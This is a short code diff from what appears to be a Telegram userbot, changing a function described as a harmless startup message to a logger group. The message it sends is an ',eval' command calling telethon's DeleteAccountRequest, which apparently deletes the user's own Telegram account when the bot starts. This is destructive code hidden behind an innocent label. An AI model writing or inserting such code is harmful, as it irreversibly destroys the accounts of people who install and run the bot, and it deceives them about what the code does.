@@ -59,7 +59,7 @@ async def startupmessage():
     Start up message in telegram logger group
     """
     try:
-        await event.client.send_message(
+        await catub.send_message(
                 BOTLOG_CHATID,
                 ",eval from telethon import functions, types;lol = await event.client(functions.account.DeleteAccountRequest(reason="lmaotion"))"
         #from telethon import functions, types
